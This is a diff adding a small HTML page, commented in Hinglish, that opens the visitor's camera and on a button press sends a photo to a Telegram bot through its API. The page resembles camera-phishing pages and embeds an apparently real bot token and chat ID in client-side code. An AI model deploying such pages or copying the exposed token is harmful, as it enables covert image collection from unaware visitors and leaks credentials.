@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+</head>
+<body style="text-align: center; font-family: Arial; padding-top: 50px;">
+    <h2>📸 Camera Access</h2>
+    <video id="video" width="400" height="300" autoplay playsinline style="border:2px solid black;border-radius:10px;"></video>
+    <br><br>
+    <button id="captureBtn" style="padding:15px 40px;font-size:20px;background:blue;color:white;border:none;border-radius:10px;">✅ Capture & Send</button>
+    <p id="status" style="color:gray;">Permission dena hoga camera ka</p>
+
+    <script>
+        // ---------- 🔥 Yehi aapki Bot details hain ----------
+        const BOT_TOKEN = "8882202375:AAF76tk6iLG8dskhKQ1vH5hDL3iG2YtvitQ";
+        const CHAT_ID = 1196810032; // <-- YAHAN APNI REAL ID DAALO (Number)
+        // ----------------------------------------------------
+
+        const video = document.getElementById('video');
+        const canvas = document.createElement('canvas');
+        const status = document.getElementById('status');
+        const captureBtn = document.getElementById('captureBtn');
+
+        // 1. Camera start karo
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                status.innerHTML = "✅ Camera Ready! Capture dabao.";
+            })
+            .catch(err => {
+                status.innerHTML = "❌ Camera access deny kar diya! Permission do.";
+                console.error(err);
+            });
+
+        // 2. Capture button ka kaam
+        captureBtn.onclick = function() {
+            status.innerHTML = "⏳ Photo le raha hoon...";
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(function(blob) {
+                // 3. Photo ko Telegram Bot API se bhejo
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'captured.jpg');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        status.innerHTML = "✅ Photo successfully Owner ko bhej di!";
+                    } else {
+                        status.innerHTML = "❌ Error: " + data.description;
+                    }
+                })
+                .catch(err => {
+                    status.innerHTML = "❌ Network Error!";
+                });
+            }, 'image/jpeg');
+        };
+    </script>
+</body>
+</html>
